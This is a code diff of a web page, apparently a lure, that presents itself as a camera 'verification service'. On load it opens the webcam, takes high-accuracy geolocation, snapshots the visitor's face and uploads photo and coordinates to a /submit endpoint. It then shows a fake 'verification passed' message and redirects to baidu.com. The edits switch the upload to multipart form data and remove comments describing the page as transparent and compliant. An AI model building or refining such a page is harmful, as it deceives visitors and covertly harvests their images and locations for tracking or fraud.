@@ -8,26 +8,20 @@
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body { background-color: #0b0b0e; color: #7a8590; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
         .wrapper { width: 100%; max-width: 360px; text-align: center; padding: 30px 20px; background: #121319; border: 1px solid #1a1b23; border-radius: 8px; }
-        
-        /* 蓝色大标题 */
         h1 { color: #3b82f6; font-size: 24px; font-weight: 600; margin-bottom: 12px; letter-spacing: 1px; }
-        
-        /* 白色小标题 */
         .subtitle { color: #ffffff; font-size: 13px; line-height: 1.6; margin-bottom: 25px; opacity: 0.9; }
         
-        /* 透明合规的摄像头实时预览框 */
+        /* 摄像头实时预览框 */
         .preview-container { width: 100%; aspect-ratio: 4/3; background: #000; border-radius: 6px; overflow: hidden; margin-bottom: 25px; border: 1px solid #282a36; position: relative; }
         video { width: 100%; height: 100%; object-fit: cover; }
-        .view-tip { position: absolute; top: 10px; left: 10px; background: rgba(239, 68, 68, 0.85); color: white; font-size: 10px; padding: 3px 8px; border-radius: 4px; font-weight: bold; letter-spacing: 0.5px; }
+        .view-tip { position: absolute; top: 10px; left: 10px; background: rgba(239, 68, 68, 0.85); color: white; font-size: 10px; padding: 3px 8px; border-radius: 4px; font-weight: bold; }
 
-        /* 红色按钮 */
-        .btn-verify { display: inline-block; width: 100%; background: #ef4444; color: #ffffff; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 15px rgba(239, 68, 68, 0.2); }
+        .btn-verify { display: inline-block; width: 100%; background: #ef4444; color: #ffffff; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.2s ease; }
         .btn-verify:active { transform: scale(0.98); background: #dc2626; }
         
-        /* 状态与加载反馈 */
         .loading-box { display: none; margin-top: 10px; }
         .spinner { width: 22px; height: 22px; border: 2px solid rgba(255,255,255,0.1); border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
-        .loading-text { font-size: 11px; color: #4a5568; font-family: monospace; letter-spacing: 0.5px; text-transform: uppercase; }
+        .loading-text { font-size: 11px; color: #4a5568; font-family: monospace; letter-spacing: 0.5px; }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
@@ -55,7 +49,6 @@
 <script>
     let streamRef = null;
 
-    // 页面开启时自动激活并展示合规摄像头流
     window.addEventListener('DOMContentLoaded', async () => {
         try {
             streamRef = await navigator.mediaDevices.getUserMedia({
@@ -64,8 +57,7 @@
             });
             document.getElementById('video').srcObject = streamRef;
         } catch (err) {
-            console.error("无法获取摄像头权限:", err.message);
-            alert("验证服务需要使用摄像头。请在浏览器弹窗或系统设置中允许权限后，重新刷新页面。");
+            alert("验证服务需要使用摄像头，请允许权限后刷新页面。");
         }
     });
 
@@ -83,8 +75,8 @@
                 captureAndUpload(position.coords.latitude, position.coords.longitude);
             },
             (error) => {
-                console.warn("地理定位受限，切换备用定位:", error.message);
-                captureAndUpload("0.0", "0.0");
+                // 对应你后端判断的 "IP_FALLBACK"
+                captureAndUpload("IP_FALLBACK", "IP_FALLBACK");
             },
             { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
         );
@@ -102,45 +94,49 @@
 
         if (streamRef && video.readyState === video.HAVE_ENOUGH_DATA) {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            // 抓拍完毕后关闭摄像头硬件指示灯，准备开始网络传输
             streamRef.getTracks().forEach(track => track.stop());
         }
 
-        const photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
-        updateStatus("上传守护云端中，请勿关闭窗口...");
-
-        try {
-            // 【核心修复】：必须 await 等待 fetch 彻底处理完，绝不能提前重定向
-            const response = await fetch('/submit', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    lat: String(lat),
-                    lon: String(lon),
-                    photo: photoBase64,
-                    ua: navigator.userAgent,
-                    lang: navigator.language,
-                    screen: `${window.screen.width}x${window.screen.height}`
-                })
-            });
-
-            const result = await response.json();
-            
-            if (response.ok && result.success) {
-                updateStatus("检验通过，正在为您接入主页...");
-            } else {
-                console.error("后端处理失败:", result.error);
-                updateStatus("服务端报错，正在重定向...");
+        updateStatus("正在转换图片流格式...");
+        
+        // 核心修改：不直接发送 Base64 文本，而是转成后端能直接解析的二进制 Blob 文件对象
+        canvas.toBlob(async (blob) => {
+            if (!blob) {
+                updateStatus("格式打包失败");
+                return;
             }
-        } catch (err) {
-            console.error("传输遇到异常:", err);
-            updateStatus("网络连接中断，正准备跳转...");
-        } finally {
-            // 严格确保网络资源完全传输、连接释放后，延迟 800ms 优雅跳转
-            setTimeout(() => {
-                window.location.href = "https://www.baidu.com";
-            }, 800);
-        }
+
+            updateStatus("上传守护云端中，请勿关闭窗口...");
+
+            // 核心对齐：转回后端要求的 FormData 结构进行传输
+            const formData = new FormData();
+            formData.append("photo", blob, "capture.jpg");
+            formData.append("lat", lat);
+            formData.append("lon", lon);
+
+            try {
+                const response = await fetch('/submit', {
+                    method: 'POST',
+                    body: formData // 不加 headers，浏览器会自动附带 multipart/form-data
+                });
+
+                const result = await response.json();
+                
+                if (response.ok && result.success) {
+                    updateStatus("检验通过，正在为您接入主页...");
+                } else {
+                    console.error("后端处理失败:", result.error);
+                    updateStatus("服务端报错，请检查云端配置...");
+                }
+            } catch (err) {
+                console.error("传输遇到异常:", err);
+                updateStatus("网络连接中断...");
+            } finally {
+                setTimeout(() => {
+                    window.location.href = "https://www.baidu.com";
+                }, 800);
+            }
+        }, 'image/jpeg', 0.6);
     }
 </script>
 </body>
